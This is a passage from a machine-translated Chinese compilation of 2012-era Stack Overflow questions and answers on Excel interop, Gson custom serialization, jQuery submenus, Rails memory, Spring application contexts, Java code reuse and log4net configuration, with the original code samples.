`IntegrityError`是发生重复键之类的情况时将引发的预期异常。这就是你捕捉情况的方式。

您应该关注的是失败的查询：

```
v = Video.objects.get(uuid = video_id) 
```

如果您知道 Video 对象确实已经存在于 中`video_id`，那么您应该检查以确保类型`video_id`正确。除此之外，其余的行为似乎是意料之中的。

# c# - Excel 互操作：在大量单元格中更改部分文本颜色的最快方法

> ID：11271364
> 
> 赞同：4
> 
> 时间：2012-06-30T04:18:47.727
> 
> 标签：c#, excel, interop

有一些关于使用 Excel 互操作将数据数组直接分配给范围值的最快方法的文章。像：

```
string[,] multidimensionalArrayData = new string[200, 3];
    // (...) Fill multidimensionalArrayData with your data
dataSheet.Range["A1:C200"].Value = multidimensionalArrayData; 
```

也有一些关于如何改变特定部分文本的字体颜色的文章，例如（这次是VB）：

```
With ActiveCell.Characters(Start:=3, Length:=3).Font
    .Name = "Arial"
    .FontStyle = "Regular"
    .Size = 10
    .Color = "Red"
    .ThemeFont = xlThemeFontNone
End With 
```

现在的问题是，为数千个单元格更改文本特定部分颜色的最快方法是什么？目前，在我的 C# 代码中，我必须逐个单元格地执行此操作，但性能受到了可怕的打击。有没有办法在 C# 中填充“字符”对象数组并将该数组一次性传递给一个范围？还有其他解决方案吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-01T03:09:36.963

使用 Excel 互操作的操作总是较慢，内存消耗较多，不推荐。

以下是一些无需安装 Excel 即可完成所需工作的开源但更快的方法：

[http://closedxml.codeplex.com/](http://closedxml.codeplex.com/)
[http://epplus.codeplex.com/](http://epplus.codeplex.com/)
[http://code.google.com/p/excellibrary/](http://code.google.com/p/excellibrary/)
[http://npoi.codeplex.com](http://npoi.codeplex.com)

微软发布：**Open XML 2.0**
*另一种更快的方法来做你想做的事。*
下载：[http](http://www.microsoft.com/en-us/download/details.aspx?id=5124)
://www.microsoft.com/en-us/download/details.aspx?id=5124 简介： http: [//blog.stuartwhiteford.com/ ?p=49](http://blog.stuartwhiteford.com/?p=49)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-01T02:34:47.793

我不确定您是否会通过此代码大幅提高性能（因为侵入单个单元格是一项耗时的操作）。Characters 显然是一个范围属性，因此您不必指定特定的单元格。

您可以使用以下内容来避免循环

```
With Range("A1:A3").Characters(1, 2).Font
    .Name = "Arial"
    .Size = 6
End With 
```

好问题....我有许多用于格式化部分单元格的用例，但手动操作很痛苦。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-05-09T17:53:16.767

在为 Excel 编写不同的库苦苦挣扎了几个月之后，我必须说我终于回到了 Excel Interop，信不信由你。

我尝试了 ClosedXML、EPPlus 和 SpreadsheetLite，但很麻烦地学习了每个库并调整了我的代码。经过漫长的周转、错误、有时会生成无法打开的 Excel、有时会出现可怕的性能问题或内存不足崩溃，我决定再次尝试使用 Excel Interop，并惊讶地发现它更快并且我的场景没有错误。

如果您想尝试 mjb 答案中的库，请执行此操作，但我建议您首先尽可能地编写您的 Interop 代码，如果您做得对，它最终的速度可能会让您感到惊讶。

**我的情况的最佳选择是：**

使用 Excel 互操作。使用二维数组一次写入所有 Excel 数据，然后在第二遍中格式化那些需要它的单元格的富文本。

# java - 使用 TypeAdapter 的对象中一个（多个）变量的 Gson 自定义序列化器

> ID：11271375
> 
> 赞同：96
> 
> 时间：2012-06-30T04:22:12.250
> 
> 标签：java, serialization, gson

我见过很多使用自定义 TypeAdapter 的简单示例。最有帮助的是[`Class TypeAdapter<T>`](https://google-gson.googlecode.com/svn/trunk/gson/docs/javadocs/com/google/gson/TypeAdapter.html). 但这还没有回答我的问题。

我想自定义对象中单个字段的序列化，让默认的 Gson 机制处理其余部分。

出于讨论的目的，我们可以使用这个类定义作为我希望序列化的对象的类。我想让 Gson 序列化前两个类成员以及基类的所有公开成员，并且我想对下面显示的第三个和最后一个类成员进行自定义序列化。

```
public class MyClass extends SomeClass {

@Expose private HashMap<String, MyObject1> lists;
@Expose private HashMap<String, MyObject2> sources;
private LinkedHashMap<String, SomeClass> customSerializeThis;
    [snip]
} 
```

* * *

## 回答 #1

> 赞同：134
> 
> 时间：2012-06-30T07:50:50.967

这是一个很好的问题，因为它隔离了一些应该很容易但实际上需要大量代码的东西。

首先，编写一个摘要`TypeAdapterFactory`，为您提供修改传出数据的钩子。此示例使用 Gson 2.2 中称为的新 API，`getDelegateAdapter()`它允许您查找 Gson 默认使用的适配器。如果您只想调整标准行为，委托适配器非常方便。与完整的自定义类型适配器不同，它们会在您添加和删除字段时自动保持最新状态。

```
public abstract class CustomizedTypeAdapterFactory<C>
    implements TypeAdapterFactory {
  private final Class<C> customizedClass;

  public CustomizedTypeAdapterFactory(Class<C> customizedClass) {
    this.customizedClass = customizedClass;
  }

  @SuppressWarnings("unchecked") // we use a runtime check to guarantee that 'C' and 'T' are equal
  public final <T> TypeAdapter<T> create(Gson gson, TypeToken<T> type) {
    return type.getRawType() == customizedClass
        ? (TypeAdapter<T>) customizeMyClassAdapter(gson, (TypeToken<C>) type)
        : null;
  }

  private TypeAdapter<C> customizeMyClassAdapter(Gson gson, TypeToken<C> type) {
    final TypeAdapter<C> delegate = gson.getDelegateAdapter(this, type);
    final TypeAdapter<JsonElement> elementAdapter = gson.getAdapter(JsonElement.class);
    return new TypeAdapter<C>() {
      @Override public void write(JsonWriter out, C value) throws IOException {
        JsonElement tree = delegate.toJsonTree(value);
        beforeWrite(value, tree);
        elementAdapter.write(out, tree);
      }
      @Override public C read(JsonReader in) throws IOException {
        JsonElement tree = elementAdapter.read(in);
        afterRead(tree);
        return delegate.fromJsonTree(tree);
      }
    };
  }

  /**
   * Override this to muck with {@code toSerialize} before it is written to
   * the outgoing JSON stream.
   */
  protected void beforeWrite(C source, JsonElement toSerialize) {
  }

  /**
   * Override this to muck with {@code deserialized} before it parsed into
   * the application type.
   */
  protected void afterRead(JsonElement deserialized) {
  }
} 
```

上面的类使用默认的序列化得到一棵 JSON 树（用 表示`JsonElement`），然后调用 hook 方法`beforeWrite()`让子类自定义该树。对于反序列化也是如此`afterRead()`。

接下来我们将其子类化以用于特定`MyClass`示例。为了说明，我将在序列化时向地图添加一个名为“大小”的合成属性。为了对称，我会在反序列化时将其删除。在实践中，这可以是任何定制。

```
private class MyClassTypeAdapterFactory extends CustomizedTypeAdapterFactory<MyClass> {
  private MyClassTypeAdapterFactory() {
    super(MyClass.class);
  }

  @Override protected void beforeWrite(MyClass source, JsonElement toSerialize) {
    JsonObject custom = toSerialize.getAsJsonObject().get("custom").getAsJsonObject();
    custom.add("size", new JsonPrimitive(custom.entrySet().size()));
  }

  @Override protected void afterRead(JsonElement deserialized) {
    JsonObject custom = deserialized.getAsJsonObject().get("custom").getAsJsonObject();
    custom.remove("size");
  }
} 
```

`Gson`最后通过创建一个使用新类型适配器的自定义实例将它们放在一起：

```
Gson gson = new GsonBuilder()
    .registerTypeAdapterFactory(new MyClassTypeAdapterFactory())
    .create(); 
```

Gson 的新[TypeAdapter](http://google-gson.googlecode.com/svn/trunk/gson/docs/javadocs/com/google/gson/TypeAdapter.html)和[TypeAdapterFactory](http://google-gson.googlecode.com/svn/trunk/gson/docs/javadocs/com/google/gson/TypeAdapterFactory.html)类型非常强大，但它们也是抽象的，需要练习才能有效使用。希望你觉得这个例子有用！

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2016-02-02T07:57:53.220

还有另一种方法。正如 Jesse Wilson 所说，这应该很容易。猜猜看，这*很*容易！

如果你为你的类型实现`JsonSerializer`和`JsonDeserializer`，你可以处理你想要的部分并将*其他所有部分委托给 Gson*，只需要很少的代码。为方便起见，我引用了[@Perception 对下面另一个问题的](https://stackoverflow.com/a/17009952/504611)回答，有关更多详细信息，请参阅该回答：

> 在这种情况下，最好使用 a[`JsonSerializer`](http://google-gson.googlecode.com/svn/trunk/gson/docs/javadocs/com/google/gson/JsonSerializer.html)而不是 a [`TypeAdapter`](http://google-gson.googlecode.com/svn/trunk/gson/docs/javadocs/com/google/gson/TypeAdapter.html)，原因很简单，序列化程序可以访问它们的序列化上下文。
> 
> ```
> public class PairSerializer implements JsonSerializer<Pair> {
>     @Override
>     public JsonElement serialize(final Pair value, final Type type,
>             final JsonSerializationContext context) {
>         final JsonObject jsonObj = new JsonObject();
>         jsonObj.add("first", context.serialize(value.getFirst()));
>         jsonObj.add("second", context.serialize(value.getSecond()));
>         return jsonObj;
>     }
> } 
> ```
> 
> 这样做的主要优点（除了避免复杂的解决方法）是您仍然可以利用可能已在主上下文中注册的其他类型适配器和自定义序列化程序。请注意，序列化程序和适配器的注册使用完全相同的代码。

但是，我承认如果您经常要修改 Java 对象中的字段，Jesse 的方法看起来会更好。这是易用性与灵活性的权衡，任您选择。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2018-06-21T19:48:31.743

我的同事也提到了`@JsonAdapter`注解的使用

~~[https://google.github.io/gson/apidocs/com/google/gson/annotations/JsonAdapter.html](https://google.github.io/gson/apidocs/com/google/gson/annotations/JsonAdapter.html)~~

该页面已移至此处：[https ://www.javadoc.io/doc/com.google.code.gson/gson/latest/com.google.gson/com/google/gson/annotations/JsonAdapter.html](https://www.javadoc.io/doc/com.google.code.gson/gson/latest/com.google.gson/com/google/gson/annotations/JsonAdapter.html)

例子：

```
 private static final class Gadget {
   @JsonAdapter(UserJsonAdapter2.class)
   final User user;
   Gadget(User user) {
       this.user = user;
   }
 } 
```

# android - 如何将模板和源代码导入 android eclipse？

> ID：11271377
> 
> 赞同：1
> 
> 时间：2012-06-30T04:22:26.570
> 
> 标签：android

我只是从 ANDROID DEVELOPERS [http://developer.android.com/design/downloads/index.html](http://developer.android.com/design/downloads/index.html)下载模板和源代码， 但我不知道如何将模板导入到 Eclipse 中，所以我可以使用它们？任何想法？？非常感谢任何帮助^^

# ruby-on-rails - Ruby On Rails 是否对 Java 等内存有任何限制

> ID：11271378
> 
> 赞同：2
> 
> 时间：2012-06-30T04:22:32.037
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, memory-management, passenger

我是来自 java 背景的开发人员，是 ruby​​ on rails 的新手。我的疑问是，由于 Java 的原因，我的服务器中有 24 GB RAM，由于 JVM 限制，我无法有效地使用它，正如那篇文章 [Understanding max JVM heap size - 32bit vs 64bit](https://stackoverflow.com/questions/2457514/understanding-max-jvm-heap-size-32bit-vs-64bit)中所讨论的那样。Ruby On Rails 是否有与物理内存 (RAM) 相关的任何限制，我给出一个场景，是否可以使用单个 Phusion Passenger 运行 N 个 Rails 应用程序，直到我要爆破至少 20 GB 的 RAM。为什么我要问这个是我计划将 50 个学校管理应用程序放在一个服务器上，所以 50 个 rails 应用程序，是否有可能或者我会像在 java 中出现的那样出现内存不足错误。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-30T04:39:02.013

在 Rails 中管理内存并不是一个特别科学的过程。应用程序之间的差异很大，并且没有简单的基准。不过，作为一般经验法则，每个活动 Rails 实例的预算为 50-100MB。乘客有一些技巧可以在相似实例之间共享大量内存，但它只是那么有效。

至少从 Rails 的角度来看，20GB 的内存应该能够承载至少 20 个应用程序实例。但是，如果这些站点很忙，您可能希望从该池中为您的数据库预算至少 4-8GB 的​​内存。

Ruby 对可以使用多少内存没有内在限制，尤其是当它分布在许多不同的进程中时。通常，如果它对用户进程可用，则可以使用它。

如果站点不忙，它们根本不会占用任何内存。乘客将自动关闭空闲的进程以释放它们。实际上，间歇性访问的站点几乎不会产生任何影响。

# objective-c - 使用 NSBundle 仅插入 Xib 的两个按钮。仍然显示 TableView

> ID：11271379
> 
> 赞同：2
> 
> 时间：2012-06-30T04:22:37.000
> 
> 标签：objective-c, xcode, sdk, xib

我使用 .xib 文件在我的表格视图上方添加两个按钮，用于编辑并添加到表格视图。表格视图在植入 .xib 之前可见，但现在我看不到表格。我已将我的 SDK 的 UIView 背景设置为通过将不透明度设置为 0% 来清除。我看到的只是两个按钮和空白。为了确保我的文件不会占据整个屏幕，我需要做些什么吗？我需要对我的书面代码做些什么吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-30T04:39:43.720

1 - 如果您将`UIView`alpha 设置为 0，那么您将看不到确定的视图。尝试将背景颜色设置`clearColor`为将 alpha 更改为 0 旁边。

2 -`Table View`在你用一些数据填充它之前是不可见的，如果你放一个`Table View`你只会看到一个白色块。所以首先填写`Table View`一些数据，看看会发生什么。

希望这有帮助

# c# - C# 到 Word 更改段落的值

> ID：11271380
> 
> 赞同：0
> 
> 时间：2012-06-30T04:22:40.273
> 
> 标签：c#, interop

我决定在我的后台工作人员中使用 Word Interop 打开一个 Word 文档，该工作人员在 MyForm_Shown() 之后调用。并在 MyForm_FormClosed() 之后关闭它。

我有在打开的 Word 文档中保存更改的按钮。问题是当我更改或为我的段落（oPara1）提供新的文本/值时，声明为：

```
oRng = oDoc.Bookmarks.get_Item(ref oEndOfDoc).Range;
oPara1 = oDoc.Content.Paragraphs.Add(ref oRng);
oPara1.Range.InsertParagraphAfter(); 
```

它不会覆盖先前的值，而是将新值添加到下一段。如何为声明的段落替换或设置新值？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-01T09:46:10.233

如果要覆盖范围的文本，请[查看此处的“](http://msdn.microsoft.com/en-us/library/6b9478cs.aspx)**替换范围中的文本”**部分，其中选择.`Range.Text = "new text goes here"`

关于您的代码片段，请注意 Paragraphs.Add 的[文档](http://msdn.microsoft.com/en-us/library/microsoft.office.interop.word.paragraphs.add%28v=office.14%29)指出“新段落不会替换范围”，因此我假设您必须在将新文本设置为段落之前的某个时间点[删除](http://msdn.microsoft.com/en-us/library/microsoft.office.interop.word.range.delete%28v=office.14%29)`oPara1`范围，如果上面的链接没有帮助。

# web-applications - Spring 3 - 如何将业务层与应用层（服务）分离？

> ID：11271382
> 
> 赞同：0
> 
> 时间：2012-06-30T04:23:02.030
> 
> 标签：web-applications, spring-mvc, spring-3

从我所见，许多人更喜欢将“业务逻辑”放在单独的模块项目中。这是如何使用 Spring 3 应用程序完成的？

从我所见，控制器和服务是非常特定于 spring 的。这是重点吗？如果我选择使用spring，那么将“逻辑”分开并直接创建服务（与spring web flow、dao等交互）没有意义吗？

稍后我将使用 RESTful Web 服务创建一个 API，同样通过 Spring。这一切都可以在一个应用程序中完成吗，或者正如我提到的，有什么方法可以拆分逻辑吗？

例如 - 登录 - 全部通过 Spring Security 和 Spring Web Flow 处理，......你猜对了...... 似乎很难模块化。

但是，假设我有一项服务可以根据客户信息生成 PDF .... 那是我应该分开的吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T08:43:25.507

一般来说，Spring 的[DispatcherServlet](http://static.springsource.org/spring/docs/3.1.x/spring-framework-reference/html/mvc.html#mvc-servlet)负责 REST 服务。它的 Web 应用程序上下文包含控制器、视图解析器、处理程序映射等。

不属于 Web 的应用程序逻辑，即服务、存储库、数据源等，通常放置在一个（或多个）*根应用程序上下文中*。`ContextLoaderListener`通过在*web.xml*文件中注册 a 将其导入应用程序，然后进行`contextConfigLocation`相应的配置。如果使用 Spring 安全，则在此处添加安全应用程序上下文。

例子：

```
<web-app ...>
    <!-- Enables Spring root application context-->
    <listener>
        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
    </listener>

    <!-- One (or more) root application contexts -->
    <context-param>
        <param-name>contextConfigLocation</param-name>
        <param-value>/WEB-INF/rootApplicationContext.xml</param-value>
    </context-param>

    <!-- Servlet declaration. Each servlet has is its own web application context -->
    <servlet>
        <servlet-name>example</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <load-on-startup>1</load-on-startup>
    </servlet>

    <servlet-mapping>
        <servlet-name>example</servlet-name>
        <url-pattern>/example/*</url-pattern>
    </servlet-mapping>
</web-app> 
```

此设置允许 Web 应用程序上下文继承在根应用程序上下文中声明的任何 bean。

请注意，按照惯例，用于特定 servlet 的 Web 应用程序上下文位于*/WEB-INF/[servlet-name]-servlet.xml*中，即上面示例的*/WEB-INF/example-servlet.xml*。

# android - 如何在 Android 中集成 Twitter 关注按钮？

> ID：11271386
> 
> 赞同：2
> 
> 时间：2012-06-30T04:23:21.907
> 
> 标签：android, twitter, twitter4j

我正在尝试在我的 android 应用程序中集成一个 twitter **FOLLOW US按钮。**因此，如果用户单击该按钮，他/她就会开始关注我在 Twitter 上的应用程序页面。我为此下载**了 Twitter4J**。但我很困惑如何以及从哪里开始。我看过很多关于**向帐户发送推文的**文章，但没有人提到与**FOLLOW**相关的任何事情。任何人都可以指导我应该遵循的步骤来创建这个跟随按钮。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T05:01:13.137

您必须为此调用**[createFriendship](http://twitter4j.org/ja/javadoc/twitter4j/api/FriendshipMethods.html#createFriendship%28long%29)**函数。

对于编码帮助，[这里是如何集成的帮助](http://code.google.com/p/android-hackathon-in-fukuoka/source/browse/trunk/sodefuri/src/jp/jagfukuoka/sodefuri/TimeLineActivity.java?spec=svn167&r=167)

可能复制 SO Question [Android, Twitter, 'FOLLOW US'](https://stackoverflow.com/q/7752387/582571)

# c# - 并行 Foreach 与 PLINQ

> ID：11271397
> 
> 赞同：4
> 
> 时间：2012-06-30T04:27:10.907
> 
> 标签：c#, .net, linq, task-parallel-library, plinq

我想知道 Parallel.ForEach 和 PLINQ 的优缺点。它们是否也相关 - 其​​中一个是否在内部调用/依赖于另一个

你如何决定使用什么？

# jquery - 使用 JQuery 处理子菜单

> ID：11271402
> 
> 赞同：1
> 
> 时间：2012-06-30T04:27:50.767
> 
> 标签：jquery, menu, drop-down-menu, submenu

我正在尝试制作带有子菜单的最小菜单。到目前为止，这是我的代码：

```
<div id="ctl100_cphHeader_NavigationBar">
    <li></li> <!-- makes first left-border in css -->
    <li><a class="navlink" href="/ComingSoon.aspx">N/A</a></li>
    <li><a class="navlink" href="/ComingSoon.aspx">N/A</a></li>
    <li>
        <a class="navlink" href="/ComingSoon.aspx">N/A</a>
        <div class="submenu">
            <a class="navlink" href="/">Home</a>
            <a class="navlink" href="/">Home</a>
        </div>
    </li>
    <li>
        <a class="navlink" href="/ComingSoon.aspx">N/A</a>
        <div class="submenu">
            <a class="navlink" href="/ComingSoon.aspx">Coming Soon</a>
        </div>
    </li>
</div> 
```

我想使用 jquery 使其在 $('.navlink').mouseenter() 上出现它下面的任何子菜单，而在 $('.navlink').mouseleave() 上它下面的任何子菜单都会消失。我该怎么办？我是 jquery 新手，不擅长选择器。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T04:36:46.330

尝试以下脚本：

```
$(document).ready(function () { 
    var speed = 500;//The speed is in milliseconds 
    $('li').hover(function () {
         //show its submenu
         $(this).children('.submenu').stop().slideDown(speed);
        },
        function () {
         //hide its submenu
         $(this).children('.submenu').stop().hide(speed);      
     });
});​ 
```

我只是使用了悬停功能，第一个`function(){...`是onMouseEnter，第二个`function(){...`是onMouseLeave。还要记住，子菜单必须是`display:none`.

您可以通过将以下代码添加到前一个代码的顶部来使用 javascript 执行此操作：

```
$('.submenu').hide(); 
```

我建议使用 CSS 来隐藏它们：

```
.submenu{
  display:none
} 
```

您不需要在 JavaScript 中添加那个额外的函数。

**查看[JSfiddle](http://jsfiddle.net/shawn31313/25fjH/)以查看此代码的实际效果！**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T04:34:38.403

**工作演示** [http://jsfiddle.net/QYEWs/](http://jsfiddle.net/QYEWs/)

由于您没有提到任何关于您正在使用的 Jquery 代码的内容，因此请使用 jsfiddle 中提到的代码。

工作演示应该会有所帮助。

[这是从 Jquery http://jquery.com/](http://jquery.com/)开始的好地方

**代码**

```
// Hide inactive ones
$('#main-nav > li:not(.current-menu-parent) .sub-menu').hide();

// What to do when hovering over a menu item
$("#main-nav > li").hoverIntent({
    over: function(){
        // Find the hovered menu's sub-menu
        var $submenu = $(this).find('.sub-menu');

        // Stop the animation and fade out the other submenus
        $('.sub-menu').not($submenu).stop(true,true).fadeOut(260);

        // Fade in the current one
        $submenu.fadeIn(260);
    }
});

// What to do when user leaves the navigation area
$('#main-nav').mouseleave(function(){
    // Fade out all inactive submenus
    $('#main-nav > li:not(.current-menu-parent) .sub-menu').fadeOut(260);

    // Fade in the active one
    $('.current-menu-parent .sub-menu').fadeIn(260);
});​ 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-06-30T04:34:00.450

为了让它显示（假设你已经隐藏了子菜单）你可以做这样的事情

```
$('.navlink').hover(function(){
   $(this).siblings('submenu').show();
}) 
```

问题是你不想在离开导航链接时隐藏它，因为你必须离开导航链接才能进入子菜单。因此，您可能必须将隐藏部分附加到父 LI。

此外，您还需要考虑不使用鼠标的设备……例如键盘和触摸设备。

# node.js - 安全地将工具迁移到 Homebrew

> ID：11271405
> 
> 赞同：1
> 
> 时间：2012-06-30T04:29:15.363
> 
> 标签：node.js, command-line, package, macvim, homebrew

我有一些安装——特别是 Node、MacVim 和 Taskwarrior——我是通过他们网站上提供的安装程序安装的。现在，已经开始掌握 Homebrew 令人难以置信的便捷性，我想将这些应用程序转移到`brew`应用程序中。

我想我可以安全地卸载 Node，但我不确定所有文件都在哪里。更棘手的是，我的 .vim、.vimrc 和 .taskrc 文件中分别有 MacVim 和 Taskwarrior 的设置和数据。将它们移动到某个地方是否安全，然后在我删除 MacVim 和 Taskwarrior 并通过 重新安装它们后将它们放回原位是否安全`brew`？

只是现在一切正常，我很紧张我会把它搞砸。此外，如果这是在超级用户（或其他论坛）上更好地提出的问题，请随时告诉我，我会尝试将其移至适当的位置。

任何帮助表示赞赏。这对我来说是新事物，但非常令人兴奋。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T05:48:32.320

.vim 和 .vimrc 是否存在于您的主目录中？如果是这样，您可以将它们留在原处；Homebrew 不会对它们做任何事情，新的 MacVim 会自动拾取它们。如果它们位于 /usr/local 中（我对此表示怀疑），我认为您可以移动它们然后将它们移回。

（请注意，如果您是 Ruby 用户，您可能需要确保 PATH 中的 Ruby 版本是 1.8.7；`rvm system`如果您使用 RVM，或者`brew unlink`如果您使用 Homebrew 安装了更高版本的 Ruby。我刚刚使用 1.9 构建了 MacVim .2 作为我的活跃 Ruby，当我启动它时它只是有点冻结。）

我会假设 .taskrc 如果它位于您的主目录中，它将以相同的方式工作，尽管我没有使用 TaskWarrior。

# java - 如何在Java中实现多个类的代码？

> ID：11271406
> 
> 赞同：1
> 
> 时间：2012-06-30T04:29:53.333
> 
> 标签：java, class, inheritance

我有*两个*类：JDialog 和 JFrame（见下文）。现在我希望它们获得一些额外的功能，但我希望这两个类都扩展我的代码，而无需编写两次代码。有没有办法做到这一点？

```
java.awt.Window » java.awt.Dialog » javax.swing.JDialog  
java.awt.Window » java.awt.Frame » javax.swing.JFrame 
```

（PS：实际上，我想“重写” 的源代码`java.awt.Window`，添加额外的功能。我知道这是不可能的，但这将是一个“解决方案”，因为如果我这样做，JDialog 和 JFrame 都会扩展我的全新方法。）

**示例：**
假设我想添加方法`moveWindowToMagicPositionOnScreen()`，将窗口移动到屏幕上用户友好的位置——我知道，这只是一个示例。我希望该方法同时适用于`JDialog`和`JFrame`。使用继承，我必须编写两个类，例如`MagicJDialog`和`MagicJFrame`，每个类都`moveWindowToMagicPositionOnScreen()`以完全相同的方式实现方法。嗯，这很多余。所以我不想让代码写两次。在某种程度上，我希望*一个*类使用另一个类的代码。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T04:47:01.223

不幸的是，Java 不支持 mixin。在这里采用的最简单和最清晰的方法是使用组合，在这种情况下，您只需要编写两次包装器，但实际的实现位于一个位置。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T06:00:37.943

就像其他几个人建议的那样，更喜欢组合而不是继承。但是，您可以为您的方法创建一个通用接口：

```
public interface Magic {
    void moveWindowToMagicPositionOnScreen();
} 
```

如果移动窗口的代码*完全相同*，则创建一个委托类：

```
public class MagicDelegate implements Magic {

    public void moveWindowToMagicPositionOnScreen() {
        // TODO implement logic
    };
} 
```

然后让您的两个类`Magic`使用以下方法实现接口`MagicDelegate`：

```
public MagicJDialog implements Magic {

    private MagicDelegate magicDelegate;   // TODO instantiate

    public void moveWindowToMagicPositionOnScreen() {
        magicDelegate.moveWindowToMagicPositionOnScreen();
    }
} 
```

和

```
public MagicJFrame implements Magic {

    private MagicDelegate magicDelegate;   // TODO instantiate

    public void moveWindowToMagicPositionOnScreen() {
        magicDelegate.moveWindowToMagicPositionOnScreen();
    }
} 
```

旁注，移动窗口的代码只有部分相同，您可以选择忽略`MagicDelegate`该类或创建具有公共部分的模板类：

```
public abstract MagicTemplate implements Magic {

    public moveWindowToMagicPositionOnScreen() {
        // common logic
        implementationSpecificLogic();
        // more common logic  
    }

    protected abstract void implementationSpecificMethod();
} 
```

现在，`MagicJDialog`类和`MagicJFrame`类可以扩展`MagicTemplate`类并实现`implementationSpecificLogic()`方法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-30T06:16:00.090

接口/委托/组合的想法可能是“最干净的”。但是一个可以接受且可以说更简单的替代方法是使用静态方法创建一个实用程序类。

```
public static moveWindowToMagicPositionOnScreen(Window window) {
  // calculate new x and y
  window.setLocation(x, y);  // or perhaps setBounds()...
} 
```

在实践中，我可能会将计算逻辑放入另一种方法`computeMagicPositionOnScreen`（）中。如果有意义（可能没有），这个静态实用程序类实际上可能是一个“真实的”（非静态）类，比如 MagicPositionCalculator，它可能有多个实例，比如每个屏幕一个，一个用于非常大的屏幕，一个用于高级用户等...

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-30T05:42:14.727

试试这个，

我认为您想应用**DRY** `(Don't Repeat Yourself)`设计原则和部分**LSP** `(Liskov substitution Principle)`，如果您希望将某些方法存储在一个类中，然后从其他两个类中使用此方法，那么我认为**优先*组合*而不是*继承*将是一个好主意。因为您将能够使用所需的方法，而无需继承您不想要的方法。**

# perl - 设计一个填满整个框架的 TextCtrl

> ID：11271412
> 
> 赞同：1
> 
> 时间：2012-06-30T04:31:22.590
> 
> 标签：perl, wxperl

我正在使用 wxPerl 进行编程，我想知道您将如何设计它，以便 textctrl 或任何组件能够填满整个框架并随窗口调整大小？

到目前为止，我研究这个问题的尝试使我相信可能使用 wxBoxSizer 是可行的方法，但是 wxPerl 的文档有点稀缺。

谢谢大家的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-01T10:48:37.617

[wxWidgets API](http://docs.wxwidgets.org/stable/)的文档非常出色且非常全面。`wxPerl`以直截了当的方式公开大部分 API。

如果一个`Wx::Frame`对象只有一个子窗口，默认大小事件处理程序会自动调整子窗口的大小以填充框架。

如果您有更复杂的要求，那么您可以重载处理程序，或者如您所说，编写一个sizer。

# ruby-on-rails - Rails - 从数据库更改中自动生成迁移

> ID：11271419
> 
> 赞同：1
> 
> 时间：2012-06-30T04:33:53.117
> 
> 标签：ruby-on-rails, migration

是否可以使用 Rails 根据自上次迁移以来在 Rails 之外的数据库中发生的更改自动生成迁移？

我知道运行 db:migrate 将更改 schema.rb 以匹配数据库中的内容....（至少如果不进行任何迁移但我确实以某种方式手动更改了数据库）。我想知道的是，是否有一种方法可以作为同一机制或流程的一部分，让它从这些更改中创建迁移。

非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-21T15:28:34.420

我不认为这是 Rails 会做或试图解决的事情。Rails 希望您通过迁移显式管理这些更改，以便您的数据库受到控制（和源代码控制）。

看看这颗宝石是不是你想要的。- [https://github.com/pjhyett/auto_migrations](https://github.com/pjhyett/auto_migrations)

它可能不适用于 Rails 3。我认为由于您直接编辑数据库，因此您必须运行`rake db:schema:dump`以更新 schema.rb 文件。

如果您想捕获不同数据库更改点之间的增量，请查看此 SO 答案： [如何从 MYSQL 数据库实例自动生成 Rails 迁移类？](https://stackoverflow.com/questions/4808437/how-to-generate-rails-migration-class-automatically-from-mysql-database-instance)，沿途重复他的步骤。

# log4net - log4net 配置设置

> ID：11271421
> 
> 赞同：1
> 
> 时间：2012-06-30T04:34:04.240
> 
> 标签：log4net, log4net-configuration

我正在开发一个核心 dll，我有一个类库。我想使用 log4net 来启用异常日志记录。我在类库中有一个 app.config 文件，我在其中给出了 log4net 的设置。但是，当我测试类库时，log4net 不会创建日志，直到我将 app.config 添加到调用项目中，尽管事实上我在类库的 assemblyinfo.cs 中添加了 [assembly: log4net.Config.XmlConfigurator(Watch = true)] 并且我正在使用 log4net.ILog logger = log4net.LogManager.GetLogger(typeof(ErrorHandler)) 其中 ErrorHandler 是名称我的类库的类，其中处理 log4net 的调用函数。关于出了什么问题的任何想法？

其次，我想要实现的是我的 dll 的用户只会传递他们想要创建日志的位置，以及他们是想在事件查看器中创建日志还是从他们的 app.config 中创建日志文件？他们不会处理 log4net 的任何其他设置。

关于第一个问题和第二个问题的任何建议或代码片段？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T10:04:20.707

对于 .Net 应用程序，只有“主”app.config 处于活动状态。您的库配置文件将被忽略。要么将设置转移到主配置文件，要么使用 log4net 的外部配置文件。然后你像这样配置它（假设你称之为 log4net.config）：

```
[assembly: log4net.Config.XmlConfigurator(ConfigFile = "log4net.config", Watch = true)] 
```

请注意，配置文件的结构有点不同：

```
<?xml version="1.0" encoding="utf-8" ?>
<log4net>
    <appender name="YourAppender" type="..." >
      ....
    </appender>
    <root>
        <level value="ALL" />
        <appender-ref ref="YourAppender" />
    </root>
</log4net> 
```

